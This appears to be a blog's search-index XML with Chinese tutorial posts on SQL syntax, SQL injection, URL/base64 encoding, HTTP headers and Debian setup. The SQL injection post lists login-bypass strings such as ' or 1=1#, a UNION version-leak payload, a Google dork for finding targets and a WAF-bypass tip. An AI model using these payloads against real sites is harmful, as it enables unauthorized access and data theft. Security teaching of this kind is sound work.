<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL基本语法</title>
      <link href="/2025/03/28/linux/SQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/03/28/linux/SQL%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、SQL概念"><a href="#一、SQL概念" class="headerlink" title="一、SQL概念"></a>一、SQL概念</h1><p>Windows版mysql的安装：<a href="https://downloads.mysql.com/archives/installer/">下载链接</a><br>图形化sql操作软件(DBeaver)：<a href="https://dbeaver.io/download">下载链接</a></p><p><strong>SQL语言的分类</strong><br>由于数据库管理系统(数据库软件)功能非常多，不仅仅是存储数据,还要包含：数据的管理、表的管理、库的管理、账户的管理、权限管理等。<br>所以，操作数据库的SQL语言，也基于功能，可以分为四类:</p><ul><li>1.数据定义：DDL(Data Definition Language)<ul><li>库的创建删除、表的创建删除</li></ul></li><li>2.数据操作：DML(DataManipulation Language)<ul><li>新增数据、删除数据、修改数据等</li></ul></li><li>3.数据控制：DCL(Data Control Language)<ul><li>新增用户、删除用户、密码修改、权限管理等</li></ul></li><li>4.数据查询：DQL(Data Query Language)<ul><li>基于需求查询和计算数据</li></ul></li></ul><p><strong>SQL的语法特征</strong></p><ul><li>SQL语法，大小写不敏感</li><li>SQL可以单行或多行书写，最后以<code>;</code>号结束</li><li>SQL支持注释：<ul><li>单行注释：– 注释内容(– 后面要有空格)</li><li>单行注释：# 注释内容(# 后面可以不加空格，推荐加上)</li><li>多行注释：&#x2F;* 注释内容 *&#x2F;</li></ul></li></ul><h1 id="二、SQL基本语法"><a href="#二、SQL基本语法" class="headerlink" title="二、SQL基本语法"></a>二、SQL基本语法</h1><p><strong>1、数据库基本操作</strong><br>登录数据库(mysql):</p><pre><code class="shell">mysql -u用户 -p密码#-u后面跟用户 -p后面跟密码，没有空格例如：mysql -uroot -powaspbwa</code></pre><p>基本查看语法</p><pre><code class="sql">查看当前数据库用户：select user();查看所有数据库：show databases;使用库：use 库名;查看当前所在库:select database();查看所有表：show tables;/* 在不切换库的时候用show tables FROM 库名; */查看表结构：desc 表名;查看创建表sql语句: show create table 表名;#最后面加\G可以以行方式显示</code></pre><h1 id="三、DQL-数据查询"><a href="#三、DQL-数据查询" class="headerlink" title="三、DQL(数据查询)"></a>三、DQL(数据查询)</h1><p>查询语句最后加上\G; 可以以行的方式更直观显示，例如：<code>select * from users\G;</code></p><p>基础语法：<code>select 列 from 表 [where 条件判断];</code></p><pre><code class="sql">查询所有字段：select * from 表名;查询指定字段：select username,password from users;条件查询：select * from users where username=&#39;admin&#39;;逻辑与：select * from users where id=1 and username=&#39;admin&#39;;#两个条件都要满足逻辑或：select * from users where id=1 or username=&#39;admin1&#39;;#只需要满足一个条件/***在不切换库的时候直接查询使用：select 列 from 库名.表名 [where 条件判断];***/</code></pre><p><strong>排序分页</strong><br>排序基础语法：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc];</code><br>(order by 列，以这里的列为排序对象，asc为升序，desc为降序)<br>分页基础语法：<code>select 列 from 表 [where 条件判断] limit 显示数量;</code><br>排序分页嵌套：<code>select 列 from 表 [where 条件判断] order by 列 [asc|desc] limit 显示数量;</code></p><h1 id="四、DDL-库、表操作"><a href="#四、DDL-库、表操作" class="headerlink" title="四、DDL(库、表操作)"></a>四、DDL(库、表操作)</h1><p><strong>库操作</strong><br>查看有哪些数据库<br><code>show databases;</code><br>使用数据库<br><code>use 数据库名称</code><br>创建数据库<br><code>create database 数据库名称 charset utf8;</code><br>删除数据库<br><code>drop database 数据库名称;</code><br>查看当前是使用的数据库<br><code>select database();</code></p><p><strong>表操作</strong><br>查看有哪些表（需要先选择数据库）<br><code>show tables;</code><br>删除表<br><code>drop table 表名称;</code><br><code>drop table if exists 表名称;</code><br>创建表</p><pre><code class="sql">create table 表名称(    列名称 列类型,    列名称 列类型):/*列类型有int-- 整数float-- 浮点型varchar(长度)   --文本，长度为数字，做最大长度限制date-- 日期类型timestamp-- 时间戳类型*/</code></pre><h1 id="五、DML-数据操作"><a href="#五、DML-数据操作" class="headerlink" title="五、DML(数据操作)"></a>五、DML(数据操作)</h1><p>DML是指数据操作语言，英文全程是Data Manipulation Language ，用来对数据库表中记录进行更新。插入<code>insert</code>   删除<code>delete</code>   更新<code>update</code></p><p><strong>数据插入 insert</strong><br>基础语法：<code>insert into 表[(列1,列2,....列n)] values(值1,值2,....值n),(值1,值2,....值n)...,(值1,值2,....值n)</code><br>示例:</p><pre><code class="sql"># 创建表create table test_table(    ID int,    name varchar(20),    age int);# 仅插入id列数据insert into test_table(ID) values(10001),(10002),(10003);# 插入全部列数据insert into test_table(ID,name,age) values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);# 插入全部列数据，快捷写法insert into test_table values(10001,&quot;周杰伦&quot;,31),(10002,&quot;王力宏&quot;,33),(10003,&quot;林俊杰&quot;,26);</code></pre><p><strong>数据删除 delete</strong><br>删除行<br>基础语法 ：<code>delete from 表 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 删除name为王五的数据delete from test_table where name=&quot;王五&quot;# 删除ID&gt;=10005的数据delete from test_table where ID&gt;=10005</code></pre><p><strong>数据更新 update</strong><br>基础语法：<code>update 表 set 列=值 [where 条件判断];</code><br>示例：</p><pre><code class="sql"># 修改age列的全部数据为30update test_table set age=30# 修改ID为10004的name为李四update test_table set name=&quot;李四&quot; where ID=10004</code></pre><h1 id="六、UNION"><a href="#六、UNION" class="headerlink" title="六、UNION"></a>六、UNION</h1><p>UNION 主要功能是把两个或者更多 SELECT 语句的结果集合并成一个结果集。</p><p>示例：</p><pre><code class="sql">-- 第一条语句SELECT user, password FROM mysql.user;-- 第二条语句SELECT user, password FROM dvwa.users;-- 联合查询SELECT user, password FROM mysql.userUNIONSELECT user, password FROM dvwa.users;</code></pre><p><strong>UNION的使用前提：</strong></p><ul><li><strong>列的数量和顺序</strong>：参与 UNION 操作的所有 SELECT 语句，其选择的列数量必须相同，并且列的顺序也要一致。</li><li><strong>数据类型</strong>：对应的列的数据类型应该是兼容的，这样才能保证合并结果的正确性。(可以数据类型不一样)</li><li><strong>去重</strong>：UNION 操作默认会去除合并结果中的重复行。如果想保留所有行，包括重复行，可以使用 UNION ALL。</li></ul><p><strong>UNION 与 UNION ALL 的区别：</strong></p><ul><li><strong>UNION</strong>：会对合并后的结果集进行去重处理，也就是只保留唯一的行。</li><li><strong>UNION ALL</strong>：不会进行去重操作，会直接把所有结果集合并在一起，即使有重复行也会全部保留。所以 - - -UNION ALL 的执行效率通常比 UNION 高，因为它不需要进行去重操作。</li></ul><p><strong>适用场景:</strong></p><ul><li><strong>数据合并</strong>：当需要把多个表中结构相同的数据合并成一个结果集时，UNION 就非常有用。</li><li><strong>数据统计</strong>：在进行数据统计时，可能需要从不同的数据源中获取数据并合并，这时也可以使用 UNION。</li><li><strong>SQL注入攻击</strong>：帮助攻击者从数据库中获取额外的信息或者猜测sql列数</li></ul>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2025/03/28/%E7%BD%91%E5%AE%89/SQL%E6%B3%A8%E5%85%A5/"/>
      <url>/2025/03/28/%E7%BD%91%E5%AE%89/SQL%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p><strong>SQL注入的危害：</strong></p><ul><li>盗取数据库中的信息</li><li>绕过登录认证(万能密码)</li></ul><h1 id="二、SQL注入的流程"><a href="#二、SQL注入的流程" class="headerlink" title="二、SQL注入的流程"></a>二、SQL注入的流程</h1><h2 id="2-1、寻找注入点"><a href="#2-1、寻找注入点" class="headerlink" title="2.1、寻找注入点"></a>2.1、寻找注入点</h2><p>寻找和数据库有交互的地方(例:注册、登录、搜索)<br>例：</p><pre><code class="url">https://www.xxxx.com/search.php?wk=xxx</code></pre><p><code>?wk=xxx</code>中xxx就是web服务器带入数据库中查询的字符串，这种情况就是和数据库交互的地方。</p><p>通过这种特征可以在谷歌搜索目标：</p><blockquote><p>谷歌搜索语法：inurl:php?id&#x3D;</p></blockquote><h2 id="2-2、判断闭合方式："><a href="#2-2、判断闭合方式：" class="headerlink" title="2.2、判断闭合方式："></a>2.2、判断闭合方式：</h2><ul><li>先判断是<strong>数字型</strong>还是<strong>字符串型</strong></li></ul><p>查看提交的参数例如<code>?wk=11</code>在11当中加入字符<code>?wk=11x</code>看有没有报错，如果报错说明是字符型。</p><ul><li>再判断闭合方式：</li></ul><p>在提交的参数后面加上一个引号(单&#x2F;双引号都有可能)例如：<code>?wk=11&#39; </code>,看是否有报错，如果都没有报错，说明大概率不存在SQL注入</p><h1 id="三、-SQL注入的分类"><a href="#三、-SQL注入的分类" class="headerlink" title="三、 SQL注入的分类"></a>三、 SQL注入的分类</h1><h2 id="3-1-、盲注"><a href="#3-1-、盲注" class="headerlink" title="3.1 、盲注"></a>3.1 、盲注</h2><p> 盲注就是在SQL注入过程中，找到注入点，执行SQL语句后，查询到的数据或者错误信息不能回显到前端页面，此时，我们需要利用一些方法进行判断或者猜测，这个过程称为盲注。</p><h3 id="3-1-1、布尔盲注"><a href="#3-1-1、布尔盲注" class="headerlink" title="3.1.1、布尔盲注"></a>3.1.1、布尔盲注</h3><p> “基于布尔判断的盲注”指的是利用SQL语句逻辑与(and)操作，判断and两边的条件是否成立，SQL语句带入数据库查询后判断返回内容(通常返回值仅有空和非空两种状态)，类似布尔型的true和false的两种状态;类似于无法开口说话的人，只能通过点头和摇头来告诉你答案正确与否。</p><p> <strong>布尔盲注的特性：</strong><br>构造条件判断式 SQL 语句，利用页面不同响应（条件为真时页面正常，为假时页面异常）来获取数据库信息。</p><p><strong>布尔注入的流程：</strong></p><h1 id="四、其它知识点"><a href="#四、其它知识点" class="headerlink" title="四、其它知识点"></a>四、其它知识点</h1><h2 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h2><h3 id="1、注释符的作用："><a href="#1、注释符的作用：" class="headerlink" title="1、注释符的作用："></a>1、注释符的作用：</h3><ul><li><strong>终止当前 SQL 语句</strong>，执行额外代码或绕过验证。</li><li><strong>隐藏恶意语句</strong>，避免语法错误。</li></ul><h3 id="2-常见数据库注释符"><a href="#2-常见数据库注释符" class="headerlink" title="2. 常见数据库注释符:"></a>2. 常见数据库注释符:</h3><table><thead><tr><th>数据库</th><th>单行注释符</th><th>多行注释符</th></tr></thead><tbody><tr><td><strong>MySQL</strong></td><td><code>#</code> 或 <code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>Oracle</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>SQL Server</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>PostgreSQL</strong></td><td><code>-- </code></td><td><code>/* ... */</code></td></tr><tr><td><strong>注意</strong>：</td><td></td><td></td></tr></tbody></table><ul><li><code>-- </code> 后需加空格（MySQL&#x2F;SQL Server），<code>#</code> 后无需空格。</li><li>在url中的时候不能用<code>#</code>,需要用<code>--+</code>，#号会被当做特殊字符处理，–代表注释，+代表空格。</li></ul><h3 id="3-典型注入场景"><a href="#3-典型注入场景" class="headerlink" title="3. 典型注入场景"></a>3. 典型注入场景</h3><p> <strong>（1）登录绕过</strong></p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;admin&#39; -- &#39; AND password = &#39;任意值&#39;;</code></pre><ul><li><strong>注入点</strong>：用户名输入 <code>admin&#39; --</code>，密码任意。</li><li><strong>效果</strong>：注释掉密码验证部分，直接返回用户 <code>admin</code> 的记录。</li></ul><p><strong>（2）联合查询注入</strong></p><pre><code class="sql">SELECT id, name FROM products WHERE id = 1 UNION SELECT version(), null -- </code></pre><ul><li><strong>作用</strong>：隐藏原查询的后续条件，返回数据库版本号。</li></ul><h3 id="4-特殊技巧"><a href="#4-特殊技巧" class="headerlink" title="4. 特殊技巧"></a>4. 特殊技巧</h3><ul><li><strong>绕过WAF</strong>：使用 <code>--%0A</code>（换行符）或 <code>#</code> 绕过部分过滤规则。</li><li><strong>闭合引号</strong>：在字符型注入中，先闭合原引号再添加注释符：<pre><code class="sql">&#39; UNION SELECT 1,2,3#</code></pre></li></ul><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p>“万能密码” 是攻击者利用 SQL 语句拼接漏洞，绕过正常的身份验证机制进入系统的方式。</p><p>形式1：<code>&#39; or 1=1#</code><br>形式2:<code>&#39; or &#39;1&#39;=&#39;1&#39;#</code><br>形式3：<code>admin&#39; or 1=1#</code></p><p><strong>举例登录验证场景：</strong><br>假设登录验证的 SQL 语句如下：</p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;$username&#39; AND password = &#39;$password&#39;;</code></pre><p>用万能密码<code>&#39; or 1=1#</code>组后：</p><pre><code class="sql">SELECT * FROM users WHERE username = &#39;&#39; or 1=1#&#39; AND password = &#39;随意密码&#39;;</code></pre><p>经过组合后用户名为空，但是经过<code>or 1=1</code>后sql语句永远为真,#后面的全部被注释，服务端返回真，攻击者就能绕过登录验证 </p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URL编码和base64</title>
      <link href="/2025/03/26/%E7%BD%91%E5%AE%89/URL%E7%BC%96%E7%A0%81%E5%92%8Cbase64/"/>
      <url>/2025/03/26/%E7%BD%91%E5%AE%89/URL%E7%BC%96%E7%A0%81%E5%92%8Cbase64/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="一、URL编码"><a href="#一、URL编码" class="headerlink" title="一、URL编码"></a><strong>一、URL编码</strong></h3><p>URL编码是一种将URL中的非ASCII字符或特殊符号转换为 <code>%XX</code> 格式的技术（XX为十六进制值）。其核心规则包括：  </p><ul><li>空格可转为 <code>+</code> 或 <code>%20</code>；  </li><li>特殊字符（如 <code>?</code>, <code>#</code>, <code>&amp;</code> 等）需转为 <code>%</code> + 十六进制ASCII码；  </li><li>仅允许保留字符（如字母、数字、<code>-</code>, <code>_</code>, <code>.</code>, <code>~</code>）不编码。</li></ul><p><strong>示例</strong>：<br><code>http://example.com/你好?name=张三</code> → <code>http://example.com/%E4%BD%A0%E5%A5%BD?name=%E5%BC%A0%E4%B8%89</code>  </p><p><strong>应用场景</strong>：<br>URL参数、表单提交、路径中的特殊字符处理。  </p><h3 id="二、Base64"><a href="#二、Base64" class="headerlink" title="二、Base64"></a><strong>二、Base64</strong></h3><p>Base64是一种将二进制数据转换为可打印ASCII字符（<code>A-Z</code>, <code>a-z</code>, <code>0-9</code>, <code>+</code>, <code>/</code>）的编码方式。其核心规则包括：  </p><ul><li>每3字节（24位）拆分为4组6位，映射到字符集；  </li><li>不足时用 <code>=</code> 填充。</li></ul><p><strong>示例</strong>：<br>中文“你好” → <code>5L2g5aW9</code>；<br>二进制 <code>00000001</code> → <code>AQ==</code>。  </p><p><strong>应用场景</strong>：<br>邮件附件、网页嵌入图片、API传输二进制数据、加密预处理。  </p><p><strong>工具函数</strong>：  </p><ul><li>JavaScript: <code>btoa()</code> &#x2F; <code>atob()</code>  </li><li>Python: <code>base64.b64encode()</code> &#x2F; <code>base64.b64decode()</code></li></ul><h3 id="三、URL编码-vs-Base64-对比表"><a href="#三、URL编码-vs-Base64-对比表" class="headerlink" title="三、URL编码 vs Base64 对比表"></a><strong>三、URL编码 vs Base64 对比表</strong></h3><table><thead><tr><th><strong>特性</strong></th><th><strong>URL编码</strong></th><th><strong>Base64</strong></th></tr></thead><tbody><tr><td><strong>用途</strong></td><td>URL中特殊字符转义（如 <code>?</code>, <code>#</code>）</td><td>二进制数据转文本（如图片、文件）</td></tr><tr><td><strong>字符集</strong></td><td><code>%</code> + 十六进制值（如 <code>%20</code> 代表空格）</td><td><code>A-Za-z0-9+/=</code></td></tr><tr><td><strong>可逆性</strong></td><td>完全可逆</td><td>完全可逆</td></tr><tr><td><strong>填充符</strong></td><td>无</td><td>有（<code>=</code>）</td></tr><tr><td><strong>数据长度</strong></td><td>可能增加（如汉字转为3字节 <code>%XX%XX%XX</code>）</td><td>增加约33%（4字符 → 3字节）</td></tr><tr><td><strong>加密性</strong></td><td>非加密（仅编码）</td><td>非加密（仅编码）</td></tr><tr><td><strong>常见场景</strong></td><td>URL参数、路径</td><td>邮件附件、图片嵌入、API数据传输</td></tr><tr><td><strong>URL安全变体</strong></td><td>无</td><td>有（<code>-</code> 替代 <code>+</code>，<code>_</code> 替代 <code>/</code>）</td></tr></tbody></table><h3 id="四、关键区别总结"><a href="#四、关键区别总结" class="headerlink" title="四、关键区别总结"></a><strong>四、关键区别总结</strong></h3><ol><li><p><strong>目标场景</strong>：  </p><ul><li>URL编码用于确保URL本身的合法性（如保留字符）。</li></ul></li><li><p><strong>字符处理</strong>：  </p><ul><li>URL编码直接替换特殊字符（如 <code>?</code> → <code>%3F</code>）。  </li><li>Base64将所有数据转换为字符集映射（如 <code>00000001</code> → <code>AQ==</code>）。</li></ul></li><li><p><strong>可逆性与安全性</strong>：  </p><ul><li>两者均为编码而非加密，敏感数据需额外加密处理。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> URL编码 </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http请求参数</title>
      <link href="/2025/03/26/%E7%BD%91%E5%AE%89/http%E8%AF%B7%E6%B1%82%E5%A4%B4/"/>
      <url>/2025/03/26/%E7%BD%91%E5%AE%89/http%E8%AF%B7%E6%B1%82%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="一、http介绍"><a href="#一、http介绍" class="headerlink" title="一、http介绍"></a>一、http介绍</h1><p><strong>http工作特点：</strong><br>1、无状态、2、支持c&#x2F;s模式、3、无连接、4、灵活、5、简单快速</p><p><strong>Cookie：</strong><br>Cookie是通过客户端保持状态的解决方案。从定义上来说，Cookie就是由服务器发给客户端的特殊信息，而这些信息以文本文件的方式存放在客户端，然后客户端每次尚服务器发送请求的时候都会带上这些特殊的信息<br>特点：<code>存储在客户端</code></p><p><strong>Session:</strong><br>Session叫会话，主要是用来检查请求数据中的Cookie字段是否在服务器存在和是否合法.<br>特点：<code>存储在服务端</code></p><p><strong>Cookie和Session的联系：</strong><br>由于HTTP协议是无状态，这个时候就需要有一个机制来告诉服务端本次操作用户是否登录，是哪个用户在执行的操作，那这套机制的实现就需要 Cookie和Session配合。</p><p><strong>报文请求格式:</strong><br>第一部分:请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本，请求类型为<code>POST</code> 要访问的资源为<code>/</code> ，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分:请求头部用来说明服务器要使用的附加信息。<br>第三部分:空行，空行是必须的。第四部分的请求数据为空，也必须有空行。<br>第四部分:请求数据也叫主体，可以添加任意的其他数据。</p><p><img src="https://picture.tanglx.cn/web/2025/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20250323210604.png" alt="报文请求格式"></p><h1 id="二、请求行"><a href="#二、请求行" class="headerlink" title="二、请求行"></a>二、请求行</h1><p>HTTP 请求行是 HTTP 请求的第一行，用于标识请求的基本信息，格式为：</p><pre><code class="http">格式：&lt;方法&gt; &lt;目标资源&gt; &lt;协议版本&gt;举例：GET /index.html HTTP/1.1</code></pre><p><strong>请求方法：</strong></p><table><thead><tr><th><strong>方法</strong></th><th><strong>用途</strong></th><th><strong>参数位置</strong></th><th><strong>安全性</strong></th><th><strong>幂等性</strong></th><th><strong>请求体支持</strong></th><th><strong>缓存</strong></th></tr></thead><tbody><tr><td><strong>GET</strong></td><td>从服务器获取数据（查询操作）</td><td>参数附加在 <strong>URL</strong> 后（?key&#x3D;value）</td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>POST</strong></td><td>向服务器提交数据（写入操作）</td><td>参数放在 HTTP <strong>请求体</strong>（Body）中</td><td>不安全</td><td>非幂等</td><td>支持</td><td>默认不缓存</td></tr><tr><td><strong>PUT</strong></td><td>替换资源（完整更新）</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>PATCH</strong></td><td>部分更新资源</td><td>URL路径标识 + <strong>请求体</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr><tr><td><strong>DELETE</strong></td><td>删除资源</td><td><strong>URL路径标识</strong>（如 <code>/res/123</code>）</td><td>不安全</td><td>幂等</td><td>支持（可选）</td><td>不可缓存</td></tr><tr><td><strong>HEAD</strong></td><td>获取资源元数据（无响应体）</td><td><strong>URL 查询参数</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>可缓存</td></tr><tr><td><strong>OPTIONS</strong></td><td>获取服务器支持的请求方法或跨域配置</td><td><strong>URL路径或全局</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>TRACE</strong></td><td>回显客户端请求（用于调试）</td><td><strong>URL路径</strong></td><td>安全</td><td>幂等</td><td>不支持</td><td>不可缓存</td></tr><tr><td><strong>CONNECT</strong></td><td>建立隧道（用于代理转发 HTTPS）</td><td><strong>目标主机和端口</strong></td><td>不安全</td><td>非幂等</td><td>支持</td><td>不可缓存</td></tr></tbody></table><h1 id="三、请求头"><a href="#三、请求头" class="headerlink" title="三、请求头"></a>三、请求头</h1><p>以下是常见 HTTP 请求头参数：</p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th><th><strong>示例</strong></th></tr></thead><tbody><tr><td><strong>User-Agent</strong></td><td>客户端信息（浏览器、操作系统等）</td><td><code>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/114.0.5735.198</code></td></tr><tr><td><strong>Accept</strong></td><td>指定客户端可接收的内容类型</td><td><code>Accept: text/html, application/json</code></td></tr><tr><td><strong>Content-Type</strong></td><td>请求体的 MIME 类型</td><td><code>Content-Type: application/x-www-form-urlencoded</code></td></tr><tr><td><strong>Content-Length</strong></td><td>请求体的字节长度（POST&#x2F;PUT 必需）</td><td><code>Content-Length: 348</code></td></tr><tr><td><strong>Host</strong></td><td>请求的目标主机和端口</td><td><code>Host: www.example.com:8080</code></td></tr><tr><td><strong>Cookie</strong></td><td>客户端发送的 Cookie 值</td><td><code>Cookie: sessionid=abc123; user=john</code></td></tr><tr><td><strong>Authorization</strong></td><td>用于身份验证的证书信息</td><td><code>Authorization: Basic dXNlcjpwYXNzd29yZA==</code></td></tr><tr><td><strong>Referer</strong></td><td>请求来源页面的 URL</td><td><code>Referer: https://www.example.com/previous-page</code></td></tr><tr><td><strong>Connection</strong></td><td>连接类型（如长连接）</td><td><code>Connection: Keep-Alive</code></td></tr><tr><td><strong>Cache-Control</strong></td><td>缓存控制指令</td><td><code>Cache-Control: max-age=3600</code></td></tr><tr><td><strong>Accept-Language</strong></td><td>客户端偏好的语言</td><td><code>Accept-Language: en-US, zh-CN</code></td></tr><tr><td><strong>Accept-Encoding</strong></td><td>客户端支持的压缩编码</td><td><code>Accept-Encoding: gzip, deflate</code></td></tr><tr><td><strong>X-Forwarded-For</strong></td><td>记录客户端真实 IP（代理或负载均衡场景下使用）</td><td><code>X-Forwarded-For: 203.0.113.1, 192.168.1.1</code></td></tr><tr><td><strong>Date</strong></td><td>请求发送的时间</td><td><code>Date: Wed, 26 Mar 2025 12:34:56 GMT</code></td></tr><tr><td><strong>If-Modified-Since</strong></td><td>资源修改时间匹配条件</td><td><code>If-Modified-Since: Wed, 26 Mar 2025 00:00:00 GMT</code></td></tr><tr><td><strong>Range</strong></td><td>请求资源的部分内容</td><td><code>Range: bytes=0-999</code></td></tr><tr><td><strong>Pragma</strong></td><td>实现特定的指令（如禁用缓存）</td><td><code>Pragma: no-cache</code></td></tr><tr><td><strong>TE</strong></td><td>传输编码偏好（如 chunked）</td><td><code>TE: trailers, chunked</code></td></tr><tr><td><strong>Via</strong></td><td>代理服务器信息</td><td><code>Via: 1.1 proxy.example.com (Apache/2.4.57)</code></td></tr><tr><td><strong>Max-Forwards</strong></td><td>代理转发次数限制</td><td><code>Max-Forwards: 5</code></td></tr></tbody></table><h1 id="四、空行"><a href="#四、空行" class="headerlink" title="四、空行"></a>四、空行</h1><p>  <strong>空行的作用</strong>：</p><ul><li>分隔请求头与请求体：空行是 HTTP 请求头与请求体之间的唯一分隔符，必须存在（即使请求体为空）。</li><li>结束请求头：服务器通过空行判断请求头已读取完毕，开始处理请求体。</li></ul><h1 id="五、请求体"><a href="#五、请求体" class="headerlink" title="五、请求体"></a>五、请求体</h1><p> 请求体的定义</p><ul><li>请求体（RequestBody）是 HTTP 请求中携带的数据部分，位于空行之后。</li><li>适用场景：常用于 POST、PUT、PATCH 等需要提交数据的方法。</li><li>GET 方法：通常不携带请求体（部分浏览器或服务器可能不支持）。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 网安 </tag>
            
            <tag> http </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debian基础配置</title>
      <link href="/2025/01/10/linux/debian%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
      <url>/2025/01/10/linux/debian%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="一、配置软件源"><a href="#一、配置软件源" class="headerlink" title="一、配置软件源"></a>一、配置软件源</h1><p>编辑<code>/etc/apt/sources.list</code>，添加下面地址(bookworm为debian12的代号，其它debian需要更换代号)</p><pre><code class="shell">deb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-updates main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ bookworm-backports main contrib non-free non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmwaredeb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free non-free-firmware</code></pre><p>更新源</p><pre><code class="shell">sudo apt update</code></pre><h1 id="二、配置静态地址"><a href="#二、配置静态地址" class="headerlink" title="二、配置静态地址"></a>二、配置静态地址</h1><p>查看网卡名称<code>ip a</code><br>编辑网卡配置文件<code>vi /etc/network/interfaces</code></p><pre><code class="shell">auto ens32allow-hotplug ens32iface ens32 inet staticaddress 192.168.88.150netmask 255.255.255.0gateway 192.168.88.2</code></pre><p>重启网卡<code>systemctl restart networking.service</code></p><p>配置dns<code>vi /etc/resolv.conf</code></p><pre><code class="shell">nameserver 114.114.114.114nameserver 8.8.8.8nameserver 8.8.8.4</code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> debian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>debian上挂载坚果云</title>
      <link href="/2025/01/10/linux/debian%E4%B8%8A%E6%8C%82%E8%BD%BD%E5%9D%9A%E6%9E%9C%E4%BA%91/"/>
      <url>/2025/01/10/linux/debian%E4%B8%8A%E6%8C%82%E8%BD%BD%E5%9D%9A%E6%9E%9C%E4%BA%91/</url>
      
        <content type="html"><![CDATA[<h1 id="一、安装相关包"><a href="#一、安装相关包" class="headerlink" title="一、安装相关包"></a>一、安装相关包</h1><pre><code class="shell">apt updateapt install davfs2</code></pre><p>借助davfs2这个工具挂载WebDAV服务，其它操作也一样的道理</p><h2 id="二、获取坚果云WebDAV"><a href="#二、获取坚果云WebDAV" class="headerlink" title="二、获取坚果云WebDAV"></a>二、获取坚果云WebDAV</h2><p><a href="https://www.jianguoyun.com/d/home#/safety">坚果云链接</a><br>示例：</p><pre><code class="text">服务器地址： https://dav.jianguoyun.com/dav/账户：test@aliyun.com(账户)密码：awyc5p7rgwq95e8c (应用密码)</code></pre><h1 id="三、配置davfs2"><a href="#三、配置davfs2" class="headerlink" title="三、配置davfs2"></a>三、配置davfs2</h1><p><strong>1、修改davfs.conf文件</strong><br>vim  &#x2F;etc&#x2F;davfs2&#x2F;davfs2.conf<br>找到对应的值改为1</p><pre><code class="shell">ignore_dav_header 1</code></pre><p>ignore_dav_header 1 是为了兼容坚果云的webdav协议</p><p><strong>2、配置webdav密码到本地</strong></p><p>添加前面拿到的坚果云相关信息保存到secrets文件<br>vim &#x2F;etc&#x2F;davfs2&#x2F;secrets</p><pre><code class="shell">https://dav.jianguoyun.com/dav/ 账号 应用密码</code></pre><p>url中的dav&#x2F;后面可以选择是否加入自己坚果云文件夹</p><p><strong>3、配置挂载</strong><br>创建挂载目录</p><pre><code class="shell">mkdir /mnt/cloud_disk</code></pre><p>手动挂载</p><pre><code class="shell">mount -t davfs -o noexec https://dav.jianguoyun.com/dav 